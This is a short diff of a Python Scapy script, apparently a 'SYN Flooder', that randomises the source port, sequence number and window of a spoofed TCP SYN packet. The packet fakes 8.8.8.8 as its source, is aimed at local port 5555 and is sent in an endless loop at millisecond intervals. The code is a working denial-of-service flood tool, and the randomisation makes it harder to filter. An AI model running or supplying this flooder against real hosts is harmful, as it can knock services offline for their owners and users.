@@ -46,7 +46,7 @@ conf.L3socket = L3RawSocket
 #     # arguments = docopt(__doc__, version="SYN Flooder 1.5")
 #     main()
 
-packet = IP(src='8.8.8.8', dst='127.0.0.1')/TCP(sport=9090, dport=5555, flags='S', seq=5, window=6)
+packet = IP(src='8.8.8.8', dst='127.0.0.1')/TCP(sport=RandInt(), dport=5555, flags='S', seq=RandInt(), window=RandInt())
 
 send(packet, inter=.001, loop=1)
 
